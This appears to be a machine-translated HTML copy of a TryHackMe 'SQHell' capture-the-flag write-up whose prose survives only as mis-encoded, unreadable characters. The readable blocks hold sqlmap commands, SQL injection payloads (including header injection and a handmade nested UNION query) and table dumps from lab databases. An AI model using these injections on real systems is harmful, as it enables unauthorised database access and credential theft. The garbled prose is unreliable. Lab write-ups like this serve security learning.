<html>
<head>
<title>TryHackMe Writeup â€” SQHell</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe Writeup â€” SQHell</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/tryhackme-sqhell-2dd7bd7f0990?source=collection_archive---------0-----------------------#2021-05-25">https://infosecwriteups.com/tryhackme-sqhell-2dd7bd7f0990?source=collection_archive---------0-----------------------#2021-05-25</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/7401190ba7fa994ac10baef82fa3cc2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/0*_-8Tp7L700TwYanP.jpeg"/></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">ç…§ç‰‡æ¥è‡ª<a class="ae kb" href="https://tryhackme.com/room/sqhell#" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/sqhell</a></figcaption></figure><p id="0d69" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å¤§å®¶å¥½ï¼Œåˆå’ŒTryHackMeç©å¾—å¼€å¿ƒäº†ã€‚æ‰€ä»¥ï¼Œè¿™æ˜¯é€šè¿‡è¿™ä¸ª<strong class="ke iu"> SQHell </strong>æŒ‘æˆ˜çš„å†™ä½œå’Œæ•…äº‹æŒ‡å—ã€‚</p><p id="d312" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated"><strong class="ke iu">æˆ¿é—´</strong>:<a class="ae kb" href="https://tryhackme.com/room/sqhell#" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/sqhell</a><br/><strong class="ke iu">çº§åˆ«</strong>:ä¸­ç­‰</p><p id="7606" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated"><strong class="ke iu">ä»»åŠ¡</strong>:å°è¯•æ‰¾åˆ°SQLæ³¨å…¥ä¸­çš„æ‰€æœ‰æ ‡å¿—</p><h1 id="79af" class="la lb it bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">æˆ‘ä»¬å¼€å§‹å§</h1><p id="2fd3" class="pw-post-body-paragraph kc kd it ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz im bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œå¯åŠ¨æœºå™¨å¹¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€IP</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi md"><img src="../Images/208773a4b1e895245056cf6c7b11e874.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6hFmdgUpQp5GcsHXIik50Q.png"/></div></div></figure><p id="ab07" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">é‚£é‡Œæœ‰ç™»å½•å’Œæ³¨å†Œé¡µé¢ã€‚è®©æˆ‘ä»¬å…ˆçœ‹çœ‹ç™»å½•é¡µé¢</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mm"><img src="../Images/e0ec96f8a64c8d6a7997532f90c26eeb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*01XpICZvKYF863NpC3rwIg.png"/></div></div></figure><p id="4d50" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å°è¯•ä½¿ç”¨ç®€å•çš„SQLæ³¨å…¥å’Œä¸å·¥ä½œã€‚è®©æˆ‘ä»¬ä½¿ç”¨<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>è¿›è¡Œæ›´æ·±å…¥çš„æ£€æŸ¥</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="3ae1" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u http://10.10.X.X/login --method=POST --data=username=admin&amp;password=admin -p username,password --risk=3 --level=3 --random-agent</span><span id="79f4" class="mv lb it mq b gy na mx l my mz">sqlmap identified the following injection point(s) with a total of 288 HTTP(s) requests:<br/>---<br/><strong class="mq iu">Parameter: username (POST)<br/>Type: boolean-based blind<br/>Title: OR boolean-based blind - WHERE or HAVING clause<br/>Payload: username=-6970' OR 4968=4968-- XSZT&amp;password=admin</strong></span><span id="e6f9" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: stacked queries<br/>Title: MySQL &gt;= 5.0.12 stacked queries (comment)<br/>Payload: username=admin';SELECT SLEEP(5)#&amp;password=admin</strong></span><span id="d5cc" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: time-based blind<br/>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>Payload: username=admin' AND (SELECT 5071 FROM (SELECT(SLEEP(5)))xYzy)-- Ncar&amp;password=admin</strong><br/>---<br/>web server operating system: Linux Ubuntu<br/>web application technology: Nginx 1.18.0<br/>back-end DBMS: MySQL &gt;= 5.0.12</span></pre><p id="082b" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">çœ‹æ¥<code class="fe mn mo mp mq b"><strong class="ke iu">username</strong></code>å­—æ®µå®¹æ˜“å—åˆ°å‡ ç§sqlæ³¨å…¥æ–¹æ³•çš„æ”»å‡»ã€‚ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹æ•°æ®åº“åˆ—è¡¨</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="646f" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/login" --method=POST --data="username=admin&amp;password=admin" -p "username,password" --risk=3 --level=3 --random-agent --dbs --threads 10</span><span id="4383" class="mv lb it mq b gy na mx l my mz">...<br/>available databases [2]:<br/>[*] <strong class="mq iu">information_schema</strong><br/>[*] <strong class="mq iu">sqhell_2</strong></span></pre><p id="a056" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">åªéœ€å°†æ‰€æœ‰æ•°æ®è½¬å‚¨åˆ°æ•°æ®åº“sqhell_2ä¸‹</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="b9da" class="mv lb it mq b gy mw mx l my mz">sqlmap -u "http://10.10.X.X/login" --method=POST --data="username=admin&amp;password=admin" -p "username,password" --risk=3 --level=3 --random-agent -D sqhell_2 --dump-all --threads 10</span><span id="f53f" class="mv lb it mq b gy na mx l my mz">...<br/>...<br/><strong class="mq iu">Database: sqhell_2<br/>Table: users<br/>[1 entry]<br/>+----+----------+---------------------------------+<br/>| id | username | password                        |<br/>+----+----------+---------------------------------+<br/>| 1  | admin    | icantrememberthisXXXXXXXXXXXXXX |<br/>+----+----------+---------------------------------+</strong><br/>...<br/>...</span></pre><p id="3cb2" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">æˆ‘ä»¬å¼€å§‹å§ï¼Œä½¿ç”¨æš´éœ²çš„å‡­è¯ç™»å½•</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi nb"><img src="../Images/54538cda134e5a5164ae3beb1735d9d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kXyNk-G-AV0RpNEORH9m9g.png"/></div></div></figure><p id="815b" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">æ‰¾åˆ°ç¬¬ä¸€é¢æ——äº†ï¼ã€‚è®©æˆ‘ä»¬å¯»æ‰¾ä¸‹ä¸€é¢æ——å¸œã€‚è®©æˆ‘ä»¬æ£€æŸ¥æ³¨å†Œé¡µé¢ã€‚åœ¨æ£€æŸ¥ç”¨æˆ·åå¯ç”¨æ€§æ—¶ï¼Œå­˜åœ¨ä¸€ä¸ªAjaxè¯·æ±‚ã€‚è®©æˆ‘ä»¬å…ˆæ£€æŸ¥ä¸€ä¸‹</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="6eab" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/register/user-check?username=admin2" -p "username" --risk=3 --level=3 --dbs --dbms=mysql --threads 10</span><span id="9174" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">available databases [2]:<br/>[*] information_schema<br/>[*] sqhell_3</strong></span></pre><p id="0977" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å“¦ï¼å­˜åœ¨å¦ä¸€ä¸ªè¡¨ã€‚è½¬å‚¨æ•°æ®åº“</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="a447" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/register/user-check?username=admin" -p "username" --risk=3 --level=3 -D sqhell_3 --dump-all --dbms=mysql --threads 10</span><span id="83ea" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_3</strong><br/><strong class="mq iu">Table: flag<br/></strong>[1 entry]<br/>+----+---------------------------------------------+<br/>| id | flag                                        |<br/>+----+---------------------------------------------+<br/><strong class="mq iu">| 1  | THM{FLAG3:97AEB3B28A486441XXXXXXXXXXXXXXXX} |<br/></strong>+----+---------------------------------------------+</span><span id="6049" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_3</strong><br/><strong class="mq iu">Table: users<br/></strong>[1 entry]<br/>+----+----------+---------------------------------+<br/>| id | username | password                        |<br/>+----+----------+---------------------------------+<br/><strong class="mq iu">| 1  | admin    | icantrememberthispassXXXXXXXXXX |<br/></strong>+----+----------+---------------------------------+</span></pre><p id="7155" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">æ‰¾åˆ°æ——å­äº†ã€‚å®é™…ä¸Šæ˜¯3å·æ——ã€‚ä½†æ˜¯æ²¡å…³ç³»ã€‚æˆ‘ä»¬å»æ‰¾å…¶ä»–äººå§ã€‚</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi nc"><img src="../Images/4d8da9b5aa9de8ced06d1196f1d4d763.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Dhqdx4kveCw58T4ZykeZGA.png"/></div></div></figure><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="0c5b" class="mv lb it mq b gy mw mx l my mz">http://10.10.X.X/post?<strong class="mq iu">id</strong>=2</span></pre><p id="7559" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">æˆ‘å¿˜äº†ç‚¹å‡»â€œé˜…è¯»æ›´å¤šâ€é“¾æ¥ã€‚çœ‹æ¥è¿˜æœ‰å¦ä¸€ä¸ªæŸ¥è¯¢å‚æ•°å¯ä¾›bruteä½¿ç”¨ã€‚è®©æˆ‘ä»¬è¯•è¯•</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8dc4" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/post?id=2" -p "id" --risk=3 --level=3 --dbs --dbms=mysql --threads 10</span><span id="e671" class="mv lb it mq b gy na mx l my mz">sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:<br/>---<br/>Parameter: id (GET)<br/><strong class="mq iu">Type: boolean-based blind</strong><br/>Title: AND boolean-based blind - WHERE or HAVING clause<br/>Payload: id=2 AND 3791=3791</span><span id="f159" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: error-based</strong><br/>Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)<br/>Payload: id=2 AND GTID_SUBSET(CONCAT(0x71706a7071,(SELECT (ELT(9206=9206,1))),0x716b7a6b71),9206)</span><span id="0b2f" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: stacked queries</strong><br/>Title: MySQL &gt;= 5.0.12 stacked queries (comment)<br/>Payload: id=2;SELECT SLEEP(5)#</span><span id="4d9e" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: time-based blind</strong><br/>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>Payload: id=2 AND (SELECT 3078 FROM (SELECT(SLEEP(5)))ERZk)</span><span id="c537" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: UNION query</strong><br/>Title: Generic UNION query (NULL) - 4 columns<br/>Payload: id=-6926 UNION ALL SELECT NULL,CONCAT(0x71706a7071,0x4c474b6e4f55716e4557424a686c4d755a564f6a4c58625550634774787947517541666b5a4e674b,0x716b7a6b71),NULL,NULL-- -<br/>---<br/>....<br/>....</span><span id="0f4e" class="mv lb it mq b gy na mx l my mz">available databases [2]:<br/>[*] information_schema<br/><strong class="mq iu">[*] sqhell_5</strong></span></pre><p id="ff0d" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å¥½äº†ï¼Œç°åœ¨åˆæœ‰ä¸€ä¸ªæ–°çš„æ•°æ®åº“å¯ç”¨äº†</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="e6d0" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/post?id=2" -p "id" --risk=3 --level=3 -D sqhell_5 --dump-all --dbms=mysql --threads 10</span><span id="f5ce" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_5</strong><br/>Table: flag<br/>[1 entry]<br/>+----+---------------------------------------------+<br/>| id | flag                                        |<br/>+----+---------------------------------------------+<br/><strong class="mq iu">| 1  | THM{FLAG5:B9C690D3B914F7038BA1FC6XXXXXXXXX} |<br/></strong>+----+---------------------------------------------+</span><span id="69b0" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_5</strong><br/>Table: posts<br/>[1 entry]<br/>+----+----------+-------------+----------+<br/>| id | user_id  |   name      | content  |<br/>+----+----------+-------------+----------+<br/><strong class="mq iu">| 1  | 1        | First Post  | XXXXXXXX |<br/>+----+----------+-------------+----------+<br/>| 2  | 1        | Second Post | XXXXXXXX |</strong><br/>+----+----------+-------------+----------+</span><span id="71dc" class="mv lb it mq b gy na mx l my mz">Database: <strong class="mq iu">sqhell_5</strong><br/>Table: users<br/>[1 entry]<br/>+----+----------+----------+<br/>| id | username | password |<br/>+----+----------+----------+<br/><strong class="mq iu">| 1  | admin    | XXXXXXXX |</strong><br/>+----+----------+----------+</span></pre><p id="43f5" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">æ‰¾åˆ°æ——å­äº†ï¼Œæ˜¯ç¬¬äº”é¢æ——..ğŸ˜…ç¬¬äºŒé¢å’Œç¬¬å››é¢æ——å¸œåœ¨å“ªé‡ŒğŸ¤”ã€‚è®©æˆ‘ä»¬çœ‹çœ‹åšæ–‡çš„ä½œè€…</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi nd"><img src="../Images/dc1e479fbffe916c9a499ccc14332669.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ONGGxH1psaTApa2dKAVDXQ.png"/></div></div></figure><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="30a0" class="mv lb it mq b gy mw mx l my mz"><a class="ae kb" href="http://10.10.135.78/user?id=1" rel="noopener ugc nofollow" target="_blank">http://10.10.135.78/user?id=1</a></span></pre><p id="a0ed" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">ä»ç”¨æˆ·ä½œè€…ä¸­æ‰¾åˆ°å¦ä¸€ä¸ªå‚æ•°ã€‚è®©æˆ‘ä»¬è¯•è¯•å§</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8596" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/user?id=1" -p "id" --risk=3 --level=3 --dbs --dbms=mysql --threads 10</span><span id="e980" class="mv lb it mq b gy na mx l my mz">available databases [2]:<br/>[*] information_schema<br/><strong class="mq iu">[*] sqhell_4</strong></span></pre><p id="38eb" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å¥½äº†ï¼Œç°åœ¨åˆæœ‰ä¸€ä¸ªæ–°çš„æ•°æ®åº“å¯ç”¨äº†</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="849e" class="mv lb it mq b gy mw mx l my mz">Database: <strong class="mq iu">sqhell_4</strong></span><span id="b80d" class="mv lb it mq b gy na mx l my mz">Table: users<br/>[1 entry]<br/>+----+----------+----------+<br/>| id | username | password |<br/>+----+----------+----------+<br/>| 1  | admin    | password |<br/>+----+----------+----------+</span></pre><p id="a0c9" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">ä½†æ˜¯è¿™ä¸ªæ•°æ®åº“ä¸­åªæœ‰ä¸€ä¸ªè¡¨ã€‚ğŸ¤”è®©æˆ‘ä»¬çœ‹çœ‹æç¤º</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi ne"><img src="../Images/6ec12235f84e198429dc7334ed58a048.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3kdZsNE-zcYYJJAY_-1TGg.png"/></div></div></figure><p id="b305" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">ä¸Šé¢å†™ç€â€œæˆ‘ä»¬å‡ºäºåˆ†æç›®çš„è®°å½•ä½ çš„IPåœ°å€â€ã€‚å¯èƒ½æ˜¯ç³»ç»Ÿä»è¯·æ±‚ä¸­è·å–IPåœ°å€å¹¶ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚æ ¹æ®ä½¿ç”¨PHPçš„ç»éªŒï¼Œ<code class="fe mn mo mp mq b"><strong class="ke iu">X-Fowarded-For</strong></code>å¤´æ˜¯ç”¨æ¥è®°å½•ç”¨æˆ·IPåœ°å€çš„ã€‚é‚£ä¹ˆï¼Œè®©æˆ‘ä»¬æ³¨å°„åˆ°å¤´éƒ¨ï¼Œ</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8609" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time-sec=1</span><span id="544d" class="mv lb it mq b gy na mx l my mz">---<br/>Parameter: X-forwarded-for #1* ((custom) HEADER)<br/><strong class="mq iu">Type: stacked queries</strong><br/>Title: MySQL &gt;= 5.0.12 stacked queries (comment)<br/>Payload: 1';SELECT SLEEP(1)#</span><span id="a59d" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: time-based blind</strong><br/>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>Payload: 1' AND (SELECT 5673 FROM (SELECT(SLEEP(1)))rCnJ)-- INff<br/>---</span><span id="f629" class="mv lb it mq b gy na mx l my mz">available databases [2]:<br/>[*] information_schema<br/>[*] <strong class="mq iu">sqhell_1</strong></span></pre><p id="ddf6" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å®ƒçš„æ—¶åŸºç›²SQLæ³¨å…¥ç±»å‹ã€‚è¿™å¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´ï¼Œå› ä¸ºå®ƒæ˜¯åŸºäºæ—¶é—´çš„ã€‚é»˜è®¤æƒ…å†µä¸‹<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>ç”¨äº†2ç§’ã€‚åªéœ€å°†å‘½ä»¤è°ƒæ•´ä¸º1ç§’ï¼Œä½¿å…¶æ›´å¿«ã€‚ç°åœ¨ï¼ŒæŠŠæ‰€æœ‰çš„æ¡Œå­éƒ½å€’åœ¨<code class="fe mn mo mp mq b"><strong class="ke iu">sqhell_1</strong></code>é‡Œé¢</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="3206" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 -D <strong class="mq iu">sqhell_1</strong> --tables --dump-all --time-sec=1</span><span id="41d4" class="mv lb it mq b gy na mx l my mz">Database: sqhell_1<br/>Table: flag<br/>[1 entry]<br/>+----+---------------------------------------------+<br/>| id | flag                                        |<br/>+----+---------------------------------------------+<br/><strong class="mq iu">| 1  | THM{FLAG2:C678ABFE1C01FCA19E039XXXXXXXXXXX} |<br/></strong>+----+---------------------------------------------+</span><span id="8df1" class="mv lb it mq b gy na mx l my mz">Database: sqhell_1<br/>Table: hits<br/>[0 entries]<br/>+----+----+---------+<br/>| id | ip | count   |<br/>+----+----+---------+<br/>+----+----+---------+</span></pre><p id="cc8f" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å¥½å§ï¼æ‰¾åˆ°ç¬¬äºŒé¢æ——å¸œäº†ï¼..ç°åœ¨æ˜¯4å·ï¼</p><p id="fa24" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å†æ¬¡å‚è€ƒæ•°æ®åº“<code class="fe mn mo mp mq b"><strong class="ke iu">sqhell_4</strong></code>ã€‚å½“æ£€æŸ¥ä¿¡æ¯æ¨¡å¼æ—¶ï¼Œå®é™…ä¸Šæœ‰å¦ä¸€ä¸ªè¡¨ï¼Œä½†å®ƒæ²¡æœ‰å‡ºç°åœ¨<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>æ‰«æä¸­</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="9a3c" class="mv lb it mq b gy mw mx l my mz">Database: information_schema</span><span id="2689" class="mv lb it mq b gy na mx l my mz">Table: INNODB_DATAFILES</span><span id="603b" class="mv lb it mq b gy na mx l my mz">[34 entries]<br/>+-----------------------------------------+------------+<br/>| PATH                                    | SPACE      |<br/>+-----------------------------------------+------------+<br/>...<br/>...<br/><strong class="mq iu">| ./sqhell_4/flag.ibd                     | 42         |<br/>| ./sqhell_4/posts.ibd                    | 43         |</strong><br/>| ./sqhell_4/users.ibd                    | 44         |<br/>...<br/>...<br/>+-----------------------------------------+------------+</span></pre><p id="4a88" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å¤ªå¥‡æ€ªäº†ğŸ˜µâ€ğŸ’«æœ‰ç‚¹éš¾ã€‚å®ƒä¸ä¼šä»<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>æ‰«æå‡ºæ¥ã€‚</p><p id="bec8" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å¦‚æœæˆ‘ä»¬æµ‹è¯•admin:passwordæ¥ä½¿ç”¨è¿™ä¸ªç”¨æˆ·å¯†ç ç™»å½•mysqlæ€ä¹ˆæ ·ï¼Ÿ</p><p id="86a8" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">æ²¡æœ‰ã€‚å¤±è´¥~~</p><p id="18f5" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å®‹æ‰¿å®ªæ€ä¹ˆæ ·ï¼Ÿï¼Ÿ</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="42ad" class="mv lb it mq b gy mw mx l my mz">ssh admin@10.10.X.X<br/>....<br/>Permission denied (publickey).<br/>....</span></pre><p id="02b9" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å‘ƒï¼ï¼..å“ˆå“ˆçš„ç¬‘..è¿™ä¸ªCTFåªæ˜¯å…³æ³¨SQLæ³¨å…¥ã€‚å¯èƒ½æ˜¯å¦ä¸€ç§æ–¹å¼</p><p id="b217" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å¦‚æœè°·æ­Œæœç´¢æç¤ºï¼Œå®ƒæŒ‡çš„æ˜¯ç›—æ¢¦ç©ºé—´ç”µå½±ã€‚</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi nf"><img src="../Images/a2a2619b591af1b78305300acbe268a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4DC9Ru4XyDvp-9YUPB_rAA.png"/></div></div></figure><p id="499a" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">è¿™å¯èƒ½æ˜¯ä¸ªæš—ç¤ºã€‚è¿™é‡Œå‘ç”Ÿäº†ä¸€äº›å¥‡æ€ªçš„äº‹æƒ…ã€‚å…³äºä¸å’Œè°çš„è®¨è®ºï¼Œéœ€è¦æ‰‹åŠ¨æŸ¥æ‰¾ã€‚å› æ­¤..ï¼Œè®©æˆ‘ä»¬ç”¨æ›´è¯¦ç»†çš„çº§åˆ«å†æ¬¡æŸ¥æ‰¾æ³¨å…¥ç±»å‹</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8098" class="mv lb it mq b gy mw mx l my mz"># sqlmap -u "http://10.10.X.X/user?id=5000" --risk=3 --level=5 --dbms=mysql --threads=10 --random-agent --dbs -v 3</span><span id="1d7e" class="mv lb it mq b gy na mx l my mz">....<br/>....<br/>---<br/>Parameter: id (GET)<br/><strong class="mq iu">Type: time-based blind<br/></strong>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>Payload: id=5000 AND (SELECT 3646 FROM (SELECT(SLEEP(5)))FYCC)<br/><strong class="mq iu">Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</strong></span><span id="3127" class="mv lb it mq b gy na mx l my mz"><strong class="mq iu">Type: UNION query</strong><br/>Title: Generic UNION query (NULL) - 3 columns<br/>Payload: id=5000 UNION ALL SELECT NULL,CONCAT(0x716b6a7171,0x4872555953536f506570474e616b55584968664f71507872784d756a5a6e487a4646565555654845,0x7178787071),NULL-- -<strong class="mq iu">Vector: UNION ALL SELECT NULL,[QUERY],NULL-- -</strong><br/>---<br/>....<br/>....</span></pre><p id="a9ba" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">ä½¿ç”¨ä¸Šé¢çš„è”åˆå‘é‡ç¤ºä¾‹ï¼Œåœ¨å‡ ä¸ªå°æ—¶çš„å°è¯•å’Œé”™è¯¯ä¹‹åï¼Œå¡«å……æŸ¥è¯¢ä»¥è®¿é—®ä»<code class="fe mn mo mp mq b"><strong class="ke iu">sqlmap</strong></code>æ— æ³•è®¿é—®çš„<code class="fe mn mo mp mq b"><strong class="ke iu">flag</strong></code>è¡¨</p><p id="5a90" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">çƒ¹é¥ªæŸ¥è¯¢åçš„æœ€ç»ˆç»“æœ:</p><pre class="me mf mg mh gt mr mq ms mt aw mu bi"><span id="8191" class="mv lb it mq b gy mw mx l my mz">5000 UNION ALL SELECT "5000 UNION SELECT flag,flag,flag,flag from flag-- -",5000,5000 from users-- -</span></pre><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mm"><img src="../Images/9555ba6923cd4b72ada08f7f2631dd69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lEFPystAfDgcaYJzv_F_DQ.png"/></div></div></figure><p id="db19" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz im bi translated">å˜£ï¼~~~ä»»åŠ¡å®Œæˆã€‚</p></div><div class="ab cl ng nh hx ni" role="separator"><span class="nj bw bk nk nl nm"/><span class="nj bw bk nk nl nm"/><span class="nj bw bk nk nl"/></div><div class="im in io ip iq"><p id="6376" class="pw-post-body-paragraph kc kd it ke b kf kg kh ki kj kk kl km kn ko kp kq kr 